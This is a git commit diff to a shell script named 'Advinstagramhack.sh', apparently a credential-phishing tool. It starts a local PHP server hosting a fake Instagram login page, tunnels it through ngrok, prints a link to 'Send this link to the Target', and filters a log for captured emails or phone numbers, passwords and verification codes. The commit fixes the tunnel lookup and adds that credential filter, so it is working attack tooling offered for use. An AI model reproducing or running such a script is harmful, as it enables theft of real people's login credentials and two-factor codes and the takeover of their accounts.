90366f220f29df9b309187146ea57ca74bc73219
Shravan <66510252+shravanjerry@users.noreply.github.com>
2020-07-04 17:52:47 +0530

    Update Advinstagramhack.sh

--- Advinstagramhack.sh
+++ Advinstagramhack.sh
@@ -51,26 +51,29 @@ read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Cho
 			 
                 1) cd sites/
                   cd instagram/
+                 
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
-                  php -S 127.0.0.1:2020 > /dev/null 2>&1 &
+                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
-                  ./ngrok http 2020 > /dev/null 2>&1 &
+                  ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
-                  link=$(curl -s -N http://127.0.0.1:2020/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                   printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                   echo ""
                   echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                   echo ""
-                  tail -f log.txt  
+                  tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"
                   
-                 
- 
+                  
                   
                 ;;
+ 
+                  
+               
 
 99)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m >> THANKS FOR JOIN US >> \e[0m'
 sleep 1
